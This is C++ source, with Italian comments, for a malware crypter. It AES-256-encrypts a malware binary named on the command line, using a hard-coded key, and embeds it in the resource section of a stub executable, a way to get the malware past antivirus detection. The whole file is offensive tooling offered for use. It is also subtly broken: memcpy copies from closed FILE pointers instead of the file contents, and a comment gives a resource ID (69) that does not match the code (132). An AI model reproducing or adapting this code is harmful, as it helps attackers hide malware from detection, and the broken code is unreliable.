#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <fstream>


using namespace std; // namespace std e' un insieme di funzioni e classi che ci permettono di scrivere codice piu' velocemente


//array che conterranno i raw byte del malware e dello stub
unsigned char* malware;
unsigned char* stub;

int AESEncrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
        }

        DWORD dwBufLen = (DWORD)payload_len;
        if (!CryptEncrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *)payload, &dwBufLen, dwBufLen)){
            return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
            return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
        }

        DWORD dwBufLen = (DWORD)payload_len;
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &dwBufLen)){
            return -1;
        }

        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(int argc, char* argv[]){
    char * malwarePath = argv[1];

    FILE* pMalware;
    FILE* pStub;
    long malwareLen;
    long stubLen;

    unsigned char key[] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
        0xab, 0xf7, 0x97, 0x71, 0xc1, 0x8c, 0x2e, 0x2a,
        0x08, 0x88, 0x3e, 0x55, 0xa8, 0x9c, 0x0f, 0xf4,
        0x92, 0xa7, 0x45, 0x58, 0x4f, 0x18, 0x33, 0x22};


    //////////////////////////////
    //Questa routine permette di aprire un file come sequenza di byte, prenderne
    //prendo il path del malware da lina di comando e lo apro in modalita' read-byte 
    pMalware = fopen(malwarePath, "rb");  // Open the file in binary mode
    fseek(pMalware, 0, SEEK_END);          // Jump to the end of the file
    malwareLen = ftell(pMalware);          // Get the current byte offset in the file
    rewind(pMalware);                      // Jump back to the beginning of the file
    fclose(pMalware);
    //////////////////////////////
    //prendo il path dello stub  lo apro in modalita' read-byte 

    pStub = fopen("mio_stub.exe", "rb");  // Open the file in binary mode
    fseek(pStub, 0, SEEK_END);          // Jump to the end of the file
    stubLen = ftell(pStub);          // Get the current byte offset in the file
    rewind(pStub);                      // Jump back to the beginning of the file
    fclose(pStub);

    //////////////////////////////
    //copio i raw bytes dei file malwere e stub in due array di unsigned char
    malware = new unsigned char[malwareLen];
    stub = new unsigned char[stubLen];
    memcpy(malware, pMalware, malwareLen); //copio la sequenza di byte del malware nel mio array malware
    memcpy(stub, pStub, stubLen); //copio la sequenza di byte del malware nel mio array malware


    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware
    for(int i = 0; i < 2000; i++){
        printf("%c",malware[i]);
    }
    AESDecrypt(malware, malwareLen, (char *)key, sizeof(key)); //decripto in AES-256 il malware
    for(int i = 0; i < 2000; i++){
        printf("%c",malware[i]);
    }
    AESEncrypt(malware, malwareLen, (char *)key, sizeof(key)); //cripto in AES-256 il malware


    //adesso dovremo aprire il file 'stub.exe' e aggiungere nella sua sezione resources (la .rsrc) il malware criptato

    HANDLE hUpdateRes;
    BOOL result;
	

    hUpdateRes = BeginUpdateResource("mio_stub.exe", FALSE);
    if (hUpdateRes == NULL)
    {
        printf("impossibile aprire lo stub per scrivere le risorse");
        return 0;
    }
    //ringraziamo il cielo che in AES-256 la lunghezza dei byte originali e dei criptati e' la stessa
    //69 e' molto importante perche' e' l'ID della risorsa che andremo a creare, quindi nello stub dovremo usare lo stesso id_risorsa
    //(potevo dargli qualsiasi valore ma 69 e' figo), BIN e' il tipo di risorsa (ovvero raw bytes)
    result = UpdateResource(hUpdateRes, "BIN", MAKEINTRESOURCE(132), NULL, malware, malwareLen);

    if(result == FALSE){
        printf("impossibile aggiungere le risorse allo stub");
        return 0;
    }
    
    if (!EndUpdateResource(hUpdateRes, FALSE)){
        printf("impossibile salvare le modifiche");
        return 0;
    }

    printf("\n\n\nSUCCESSO\n\n\n");
    return 0;
}